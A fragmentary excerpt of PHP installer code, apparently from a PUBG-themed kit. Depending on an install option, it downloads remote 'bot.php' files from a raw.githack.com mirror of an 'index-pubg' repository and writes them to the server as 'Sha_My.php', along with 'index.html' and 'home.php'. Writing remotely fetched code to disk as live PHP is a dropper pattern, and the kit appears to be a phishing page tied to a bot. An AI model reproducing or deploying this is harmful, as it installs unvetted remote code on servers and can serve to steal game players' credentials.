...
$xx = file_put_contents("index.html", $index); 
 ...
 if($install=="M"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/M/bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);
...
$homee = file_put_contents("home.php", $home);
 ...
 if($install=="H"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/H/bott.php");
$xx = file_put_contents("Sha_My.php", $shamy);
...
$xx = file_put_contents("index.html", $index);
 ...
 if($install=="P"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/P/bot.php");
$xx = file_put_contents("Sha_My.php", $shamy); 
